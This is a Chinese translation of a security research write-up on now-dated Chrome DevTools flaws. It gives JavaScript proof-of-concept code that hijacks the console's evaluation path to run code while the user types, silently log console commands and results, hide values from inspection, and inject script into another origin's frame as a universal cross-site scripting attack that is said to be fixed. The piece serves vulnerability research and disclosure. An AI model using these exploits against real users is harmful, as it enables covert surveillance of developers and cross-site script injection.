# Google Chrome 开发者工具漏洞利用

原文链接:[http://www.hydrantlabs.org/Security/Google/Chrome/](http://www.hydrantlabs.org/Security/Google/Chrome/)

0x00 引言
-------

* * *

故事起源于 Chromium 源码里名为[InjectedScriptSource.js](https://code.google.com/p/chromium/codesearch#chromium/src/third_party/WebKit/Source/core/inspector/InjectedScriptSource.js)的文件，这个文件负责控制台中的命令执行。也许很多人都会这么说:

【Wait!为什么是 JavaScript 在负责命令执行,Chromium/Chrome 不是用 C++编写的么?】

没错.Chromium/Chrome 的绝大部分确实不是用 javascript 编写的,但是 devtools 实际上都是一些网页。作为简单的证明,你可以尝试在浏览器里访问下面的 URL,可以看到它和console 拥有完全相同的构造。

```
chrome-devtools://devtools/bundled/devtools.html  

```

好吧，我承认开始有点跑题了。让我们回到原来的问题。在文件InjectedScriptSource.js的624行左右，在名为_evaluateOn的函数里，我们可以看到这样的一段代码：

```
prefix = "with ((console && console._commandLineAPI) || { __proto__: null }) {";
suffix = "}";
// *snip*
expression = prefix + "\n" + expression + "\n" + suffix;

```

这是个相当重要的函数，因为一些特殊的函数，比如：copy('String to Clip Board') 和 clear()都被加到了这里。然而这些函数都是类CommandLineAPI的成员。

0x01 漏洞 1
---------

* * *

一切都将从这里变得有趣。因为我有个想法，可以把ECMAScript 5里的Getters和Setters 利用起来。因为开发者工具总是会在用户输入命令时试图给用户一些命令补全的建议。通过开发者工具的这个特点，我们就可以使用Getters和Setters来构造一个函数，实现在用户输入命令的过程当中就去执行用户的输入。这意味着在用户按下Enter之前命令就已经被执行了。

```
Object.defineProperty(console, '_commandLineAPI', {
 get: function () {
  console.log('A command was run');
 }
});

```

0x02 简单禁用控制台访问
--------------

* * *

这里使用的思路和 FaceBook 是差不多的。

```
Object.defineProperty(console, '_commandLineAPI', {  
get: function () {  
throw 'Console Disabled';  
}  
});  

```

如同你看到的,我们只要在_commandLineAPI 被检索时,抛出异常就可以简单的禁用控制台的命令执行。

0x03 引言 II
----------

* * *

在开始讲解更为有趣的内容之前，我觉得我们有必要先停一下脚步，再来谈谈JavaScript的话题。让我们先来看看下面的例子：

```
function argCounter() {
 console.log('This function was run with ' + arguments.length + ' arguments.');
}
argCounter(); // 0
argCounter('Hello', 'World') // 2
argCounter(1, 2, 4, 8, 16, 32, 64) 

```

就如大家知道的，这里的arguments实际上并不是一个数组，而是一个对象。这也是为什么很多人会用下面的方法来将对象转换为传统的数组：

```
var args = Array.prototype.slice.call(arguments)

```

  其中的一个原因是，object有一些保留字段，比如:callee。在这里我们可以给出一个示例：

```
// Traverse an object looking for the 'World' key value
var traverse = function(obj) {
 // Loop each key
 for (var index in obj) {
  // If another object
  if (typeof obj[index] === 'object') {
   // Recursion yay!
   arguments.callee(obj[index]);
  }
  // If matching
  if (index === 'World') {
   console.log('Found world: ' + obj[index]);
  }
 }
};
// Call traverse on our object
traverse({
 'Nested': {
  'Hello': {
   'World': 'Earth'
  }
 }
});  

```

我想这方面的内容应该是比较罕见的。但是说到罕见，可能对arguments.callee.caller有所理解的人，相对来说会更少一些吧。它允许脚本引用调用它的函数。可以说它的实际效用并不大，但我还是尝试着写了一个例子：

```
// Print the ID of the caller of this function
function call_Jim() {
 // Get the calling function name without the call_Jim_as part
 return 'Hi ' + arguments.callee.caller.name.substring('call_Jim_as_'.length) + '!'; 
}
// Call Jim as John
function call_Jim_as_John() {
 return call_Jim();
}
// Call Jim as Luke
function call_Jim_as_Luke() {
 return call_Jim();
}
// Test cases
call_Jim_as_John(); // 'Hi John!'
call_Jim_as_Luke(); // 'Hi Luke!'

```

0x04 漏洞 II
----------

* * *

我们的第二个漏洞将会使用之前提到的arguments.callee.caller。当一个没有父函数的函数在standard context 中被执行时，arguments.callee.calle就会变成null。在这里有一个有趣的现象。当脚本在开发者工具的console里执行的时候，调用的函数是在本文开头说的_evaluate0n函数而并未是所期待的null。如果我们尝试着在控制台输入下面的命令，控制台就会dump出_evaluateOn函数的源代码：

```
(function () {
 return arguments.callee.caller;
})();

```

也许你会说： 这看上去是挺严重的，但是这和第一个漏洞有什么关系？先不说有什么关系，就算会把源码dump出来又怎样呢？ 现在就让我们把它和第一个漏洞关联起来。设想一下如果用户试图把下面的代码粘贴到console里会发生什么？

```
Object.defineProperty(console, '_commandLineAPI', {
 get: function () {
  console.log(arguments.callee.caller);
 }
});

```

就如同你所看到的，这段代码意味着只要用户试图在控制台中进行任何的输入，就会把devtools的源代码dump出来。问题又来了，也许你会问：

那又如何？我完全可以去官网在线阅读这些源码！

我想问题的重点在arguments.callee.caller.arguments.这意味着？对！这意味着我们的一些邪恶的代码（来自一些不被信任的站点）可以访问开发者工具的一些变量和对象，在编写这个exploit之前我们先看一下，我们可以通过一个简单的页面都可以干一些什么：

```
<script>
Object.defineProperty(console, '_commandLineAPI', {
 get: function () {
  console.log(arguments.callee.caller.arguments[2]);
 }
});
</script>

```

现在让我们试着执行alert(1),并观察结果：

```
0: function evaluate() { [native code] }
1: InjectedScriptHost
2: "console"
3: "with ((console && console._commandLineAPI) || {}) {↵alert(1)↵}"
4: false
5: true

```

看一下第二个参数（InjectedScriptHost）。你可以通过这个链接来阅读更多的细节[InjectedScriptExterns.js](https://code.google.com/p/chromium/codesearch#chromium/src/third_party/WebKit/Source/core/inspector/InjectedScriptExterns.js)。把精力集中在其中几个重要的函数当中。

clearConsoleMessages - 清空控制台并删除回溯

```
InjectedScriptHost.clearConsoleMessages();

```

functionDetails - 返回函数的相关细节

```
// Create a function with a bound this
InjectedScriptHost.functionDetails(func);

```

inspect - 检查DOM对象，不会切换到inspect tab

```
// Inspect the body node
InjectedScriptHost.inspect(document.body);

```

inspectedObject - 从DOM对象检查历史中取回对象

```
// Get the first inspected object
InjectedScriptHost.inspectedObject(0);

```

0x05 禁用控制台访问进阶篇
---------------

* * *

现在让我们试着写一个更完善的控制台访问禁用脚本出来。这次我不希望再看到那些让人恶心的红色错误提示了。让我们从“当用户在控制台输入命令时会发生一些什么”开始吧。函数_evaluateOn会通过一些参数：

```
evalFunction: function evaluate() { [native code] }
object: InjectedScriptHost
objectGroup: 'console'
expression: 'alert(1)'
isEvalOnCallFrame: false
injectCommandLineAPI: true

```

然后执行下面的代码：

```
var prefix = "";
var suffix = "";
if (injectCommandLineAPI && inspectedWindow.console) {
 inspectedWindow.console._commandLineAPI = new CommandLineAPI(this._commandLineAPIImpl, isEvalOnCallFrame ? object : null);
 prefix = "with ((console && console._commandLineAPI) || { __proto__: null }) {";
 suffix = "}";
}
if (prefix)
 expression = prefix + "\n" + expression + "\n" + suffix;
var result = evalFunction.call(object, expression);

```

查看一下evalFunction我们会发现它只是InjectedScriptHost.evaluate。这样一来，我们似乎是没有办法来完成这个任务了。wait！也许我们可以增加一个setter.用下面的代码我们就可以达到在不报错的情况下实现控制台命令执行的禁用了。

```
// First run
var run = false;
// On console command run
Object.defineProperty(console, '_commandLineAPI', {
 get: function () {
  // Only run once
  if (!run) {
   run = true;
   // Get the InjectedScriptHost
   var InjectedScriptHost = arguments.callee.caller.arguments[1];
   // On evaluate
   Object.defineProperty(InjectedScriptHost, 'evaluate', {
    get: function () {
     // Return a alternate evaluate function
     return function() {
      return "The console has been disabled";
     }
    }
   });
  }
 }
});

```

0x06 控制台日志记录
------------

* * *

我想你大概猜到之前搞了那么多，并不只是为了编写一个不会报错的脚本。让我们来找一些乐子。让我们编写一个可以让命令和预期一样正常执行并能记录所有的命令和执行结果的脚本。这里是我的POC：

```
// First run
var run = false;
// Save the command line api
var _commandLineAPI = null;
// On console command run
Object.defineProperty(console, '_commandLineAPI', {
 get: function () {
  // Only run once
  if (!run) {
   run = true;
   // Get the InjectedScriptHost
   var InjectedScriptHost = arguments.callee.caller.arguments[1];
   // On evaluate
   Object.defineProperty(InjectedScriptHost, 'evaluate', {
    get: function () {
     // Return a alternate evaluate function
     return function(command) {
      // Get the commands split
      var commands = command.split("\n");
      // Execute the real evaluate function
      var result = InjectedScriptHost.__proto__.evaluate.apply(this, arguments);
      // Ignore suggustion executions for now
      if (commands.length <= 1 || (result && result.name === 'getCompletions')) {
       return result;
      }
      // Remove the first "with..." and last "}" lines
      command = commands.slice(1, -1).join("\n");
      // Next step to ignore suggustion checks
      if (command.trim() === 'this') {
       return result;
      }
      // Log the command and result (tries to lazily parse to a string for now)
      document.write("Attempted Command:<br /><pre>" + command + "</pre>");
      document.write("Command Result:<br /><pre>" + result + "</pre><hr />");
      // Return the result
      return result;
     }
    }
   });
  }
  // Return the actual command line api
  return _commandLineAPI;
 },
 set: function(value) {
  // Copy the value
  _commandLineAPI = value;
 }
});

```

0x07 控制台检查
----------

* * *

记录控制台命令确实挺有趣的。但是让我们看看能不能不通过查看源代码的方式来访问变量（这个方法还并不完美，但是可以让你理解我们可以做到一些什么）

```
// Add our secret key and value
window.secret = 'Top secret key here';
// First run
var run = false;
// Save the command line api
var _commandLineAPI = null;
// On console command run
Object.defineProperty(console, '_commandLineAPI', {
 get: function () {
  // Only run once
  if (!run) {
   run = true;
   // Get the InjectedScriptHost
   var InjectedScriptHost = arguments.callee.caller.arguments[1];
   // On evaluate
   Object.defineProperty(InjectedScriptHost, 'evaluate', {
    get: function () {
     // Return a alternate evaluate function
     return function(command) {
      // Execute the real evaluate function
      var result = InjectedScriptHost.__proto__.evaluate.apply(this, arguments);
      // When the command was a attempt to access the completions
      if (result && result.name === 'getCompletions') {
       // Return a new completions function
       return function() {
        // Get the completions
        var completions = result.apply(this, arguments);
        // Remove the secret completion
        delete completions.secret;
        // Return the modified values
        return completions;
       }
      }
      // If the result is our secret value
      if (result === window.secret) {
       return undefined;
      }
      // Return the result
      return result;
     }
    }
   });
  }
  // Return the actual command line api
  return _commandLineAPI;
 },
 set: function(value) {
  // Copy the value
  _commandLineAPI = value;
 }
});

```

0x08 通用的跨站脚本攻击
--------------

* * *

现在让我们来讨论一下这个已经被修复的漏洞。这个漏洞可以在一些用户交互的基础上将恶意站点的A内的脚本或页面植入到站点B当中。它的工作原理很简单。当用户审查元素时，它会被加入到历史数组里。用户可以通过console.$0来访问它。但是遗憾的是，如果它已经通过别的域名被执行，我们就无法访问它。如果想要真正的利用这个exploit，我们至少需要用户右键点击这个iframe，打开控制台并输入命令。

我想会有很多社工性质的方法可以让我们去引导用户去完成这一系列的操作。当然我个人认为最有效的方法就是什么都不要去做，而是等待开发者自己攻击自己。我也做了一个POC来证明，这一切的可行性。如果完成上述的操作要求来，不出意外alert(document.domain)应该会被执行。

```
// On console command run
Object.defineProperty(console, '_commandLineAPI', {
 get: function () {
  // Save a reference to the InjectedScriptHost globally
  window.InjectedScriptHost = arguments.callee.caller.arguments[1];
  // Get the injectedScript object
  window.injectedScript = InjectedScriptHost.functionDetails(arguments.callee.caller.arguments.callee).rawScopes[0].object.injectedScript;
  // Trigger another inspect (not sure why this helps but it does)
  injectedScript._inspect(document.getElementById('hacks'));
  // Keep checking if an element has been inspected every 10th of a second
  var check = function() {
   // Hide any errors on the console to keep people unaware
   try {
    // Get the first inspected object
    var el = injectedScript._commandLineAPIImpl._inspectedObject(1);
    // Loop until no more parents
    while (el.parentNode) { el = el.parentNode; }
    // If the element is not the current page
    if (el.URL !== window.location.href) {
     // Stop checking
     clearInterval(check);
     // Create the script element
     var script = document.createElement('script');
     script.type = 'text/javascript';
     script.innerHTML = "alert(document.domain)";
     // Add the script to the frame
     el.getElementsByTagName('head')[0].appendChild(script);
    }
   } catch (e) {}
  };
  // Return the orginal evaluate function
  return InjectedScriptHost.__proto__.evaluate;
 }
});

```

就如我之前说的那样，[[email protected]](http://drops.com:8000/cdn-cgi/l/email-protection)个漏洞或者补丁感兴趣，可以点击这里[here](http://trac.webkit.org/changeset/138228).

0x09 最后
-------

* * *

也许你应该留意一下InjectedScriptHost.functionDetails的用法。因为它是很强大的函数。这里是个比较常见的使用例 :

```
// Add another scope
with ({
 'test': true
}) {
 var func = function() {}
}
// Log the details
console.log(InjectedScriptHost.functionDetails(func));

```

上面的命令将会返回如下的结果：

```
{
 location: {
  columnNumber: 14,
  lineNumber: 4,
  scriptId: "1262"
 },
 name: "func",
 rawScopes: [
  {
   object: {
    test: true
   },
   type: 2
  }, {
   object: { },
   type: 2
  }, {
   object: [object Window],
   type: 3
  }
 ]
}

```

就如同你看到的它是一支强大的潜力股，尤其是它被应用到一些内部函数时。举个例子，如果我们把它应用到_evaluateOn函数上，我们将得到如下的结果：

```
{
 inferredName: "InjectedScript._evaluateOn",
 location: {
  columnNumber: 25,
  lineNumber: 591,
  scriptId: "1417"
 },
 rawScopes: [
  {
   object: {
    CommandLineAPI: function CommandLineAPI(commandLineAPIImpl, callFrame)
    InjectedScript: function ()
    InjectedScriptHost: InjectedScriptHost
    Object: function Object() { [native code] }
    bind: function bind(func, thisObject, var_args)
    injectedScript: InjectedScript
    injectedScriptId: 58
    inspectedWindow: Window
    slice: function slice(array, index)
    toString: function toString(obj)
   },
   type: 3
  }, {
   object: [object Window],
   type: 0
  }
 ]
}

```

我写了一个函数，可以帮助我们快速发现和列出一些具有潜在价值的函数（作用域非当前窗口）

```
// Run via console as `listScopes();`
function listScopes() {
 // Total results
 var results = 0;
 // Ignore these because they are cyclical
 var cyclical = [
  'window.top',
  'window.window',
  'window.clientInformation.mimeTypes',
  'window.clientInformation.plugins',
  'window.console._commandLineAPI.$_',
  'func[0].object.inspectedWindow',
  'func[1].object'
 ];
 // Element that have been chacked already
 var checked = [];
 // Save a reference to the InjectedScriptHost globally
 var InjectedScriptHost = arguments.callee.caller.arguments[1];
 // Get the scope of a function
 window.scope = function(func, i) {
  return InjectedScriptHost.functionDetails(func).rawScopes[i].object;
 }
 // Check the scopes of an object
 function checkScopes(current_name, obj) {
  // Loop each key
  for (var index in obj) {
   // If the var has not been checked
   if (checked.indexOf(obj[index]) === -1) {
    checked.push(obj[index]);
    var name = current_name;
    if (isNaN(index)) {
     name = name + '.' + index;
    } else {
     name = name + '[' + index + ']';
    }
    // If not cyclical
    if (cyclical.indexOf(name) === -1) {
     // If an array or object
     if (typeof obj[index] === 'object') {
      // Yay recursion
      checkScopes(name, obj[index]);
     }
    }
    if (typeof obj[index] === 'function') {
     // Get the scopes
     var scopes = InjectedScriptHost.functionDetails(obj[index]).rawScopes;
     // Don't index our scopes function
     if (obj[index] !== window.scope) {
      // Loop each scope
      for (var i in scopes) {
       // If it's not a window
       if (InjectedScriptHost.internalConstructorName(scopes[i].object) !== 'Window') {
        name = 'scope(' + name + ', ' + i + ')';
        // Add the path
        console.log(name);
        results++;
        // Recursion again
        checkScopes(name, scopes[i].object);
       }
      }
     }
    }
   }
  }
 }
 // Check all known objects
 checkScopes('window', window);
 window.args = arguments.callee.caller.arguments;
 checkScopes('args', args);
 window.func = InjectedScriptHost.functionDetails(arguments.callee.caller).rawScopes;
 checkScopes('func', func);
 // Return
 return "Searching finished, found " + results + " results.";
};

```

你可以通过 listScopes() 来在控制台执行它。也许还有一些BUG需要在日后解决。但是我觉得这依然是个不错的方法。